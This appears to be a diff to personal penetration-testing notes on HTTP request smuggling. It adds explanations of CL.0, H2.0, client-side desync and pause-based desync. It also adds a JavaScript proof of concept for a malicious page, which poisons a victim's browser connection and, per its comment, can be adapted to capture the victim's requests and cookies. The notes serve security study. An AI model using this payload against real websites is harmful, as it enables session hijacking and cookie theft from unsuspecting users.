@@ -26,7 +26,17 @@ The message is terminated with a chunk of size zero, so something like this `0\r
 ### CL.0 & H2.0
 Sometimes, endpoint that don't expect to receive `POST` requests will just ignore the `Content-Length` header. This allows to smuggle request by simply sending the start of a new request in the main request body. Look at [this PoC](#cl0--simple).
 
-The same thing might happen with HTTP/2 downgrading. The back-end might ignore the content-length header. We call this **H2.0** :water: **vulnerability**.
+The same thing might happen with HTTP/2 downgrading. The back-end might ignore the content-length header. We call this H2.0 💦 vulnerability.
+
+### Desync & Pause-Based
+These vulnerabilities can work without malicious requests that browsers can send. This opens an attack vector in a way that attackers can set up a malicious website that poisens the client sided connection of the victim. Then it sets the location to the vulnerable website to activate the attack. Is called desync attack. [PoC](#client-side--desync)
+
+Sometimes when you pause in the middle of the request, the front-end and back-end might react to this differently. This can essentially cause something like CL.0. It depends on these conditions:
+- The frond-end server must immediately forward each byte of the request to the back-end rather than waiting until it has received the full request.
+- The frond-end server must not (or can be encouraged not to) time out requests before the back-end server.
+- The back-end server must leave the connection open for reuse following a read timeout.
+
+Use Burp Turbo Intruder for this, because you can easily pause attacks, and continue. Take a look [here](../burp/turbo_intruder.md#pause-based-desync-attack) for an in depth explanation on how to use Turbo Intruder for this, with a step by step example.
 
 ## Exploitation
 
@@ -101,6 +111,22 @@ Content-Length: 27
 
 GET /admin HTTP/1.1
 Foo: x
+```
+
+### Client-Side | Desync
+Put this on the malicious website.
+```js
+fetch('https://vulnerable-website.com/vulnerable-endpoint', {
+    method: 'POST',
+    body: 'GET /hopefully404 HTTP/1.1\r\nFoo: x', // malicious prefix. Change to request to store victims request(+cookies)
+    mode: 'cors', // trigger CORS error to prevent the browser redirect
+    credentials: 'include' // poisons the "with-cookies" connection pool
+}).catch(() => { // or use ".then" if you use "mode: no-cors"
+    fetch('https://vulnerable-website.com/', {// uses the poisoned connection
+    mode: 'no-cors', // so the request shows up in the chrome network tab
+    credentials: 'include'
+    })
+})
 ```
 
 # HTTP/2
